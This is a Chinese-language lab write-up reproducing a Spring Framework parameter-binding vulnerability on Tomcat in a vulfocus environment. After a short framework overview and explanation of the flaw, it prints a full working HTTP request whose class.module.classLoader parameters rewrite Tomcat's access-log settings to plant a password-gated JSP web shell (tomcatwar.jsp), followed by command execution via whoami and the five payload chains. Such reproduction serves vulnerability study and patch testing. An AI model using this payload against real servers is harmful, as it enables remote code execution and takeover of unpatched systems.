## Spring Framework简单介绍

Spring
Frame为现代企业应用程序提供了一个全面和可配置的编程模型，开发者可以根据需要快速选择需要的模块。使用spring来管理应用程序，可以将开发者从基础框架中解脱出来，专注于业务逻辑开发，极大提高开发效率。

Spring主要是以下模块组成：

![1652498413_627f1fed99c77dbef8003.png!small?1652498414148](https://image.3001.net/images/20220514/1652498413_627f1fed99c77dbef8003.png!small?1652498414148)

  * Core container：IOC为核心层
  * Resource：资源
  * Aop：面向切面编程
  * Data Access：数据库访问层
  * Web：spring mvc层
  * Test：spring测试框架

## 漏洞原理

此次漏洞触发位置在spring-beans包中,当Spring利用了SpringMVC的参数绑定( **Spring MVC
框架的参数绑定功能提供了将请求中的参数绑定控制器方法中参数对象的成员变量** )，并且开启了Accesslog功能时,通过
Classloader构造恶意请求获取AccessLogValue 对象并注入恶意字段值，来更改 Tomcat 服务器的日志记录属性触发 pipeline
机制写入任意路径下的文件。

## 漏洞复现

本此漏洞复现用的是vulfocus环境，一键部署后打开环境出现如下页面：

![1652500817_627f2951e9e37bf9718fa.png!small?1652500818934](https://image.3001.net/images/20220514/1652500817_627f2951e9e37bf9718fa.png!small?1652500818934)

对页面进行抓包；并构造payload

![1652503573_627f34151365fd749502b.png!small?1652503573647](https://image.3001.net/images/20220514/1652503573_627f34151365fd749502b.png!small?1652503573647)

  

payload如下：

> POST / HTTP/1.1  
> Host: 123.58.236.76:14289  
> Cache-Control: max-age=0  
> Upgrade-Insecure-Requests: 1  
> User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
> (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36  
> Accept:
> text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-> exchange;v=b3;q=0.9  
> Accept-Encoding: gzip, deflate  
> Accept-Language: zh-CN,zh;q=0.9  
> Cookie: xxxxxxx  
> Connection: close  
> suffix: %>//  
> c1: Runtime  
> c2: <%  
> DNT: 1  
> Content-Type: application/x-www-form-urlencoded  
> Content-Length: 764
>
>
> class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=

然后访问我们构造的tomcatwar.jsp的地址传入命令：whoami

![1652503592_627f34284c4384cf0540f.png!small?1652503592874](https://image.3001.net/images/20220514/1652503592_627f34284c4384cf0540f.png!small?1652503592874)

成功执行命令

下面是payload的五个利用链：

class.module.classLoader.resources.context.parent.pipeline.first.pattern=spring  
class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp  
class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT  
class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar

class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=  
具体调用流程可以去参考大佬博客：[大佬解释﻿](https://www.sohu.com/a/535760028_121292904 "大佬解释")

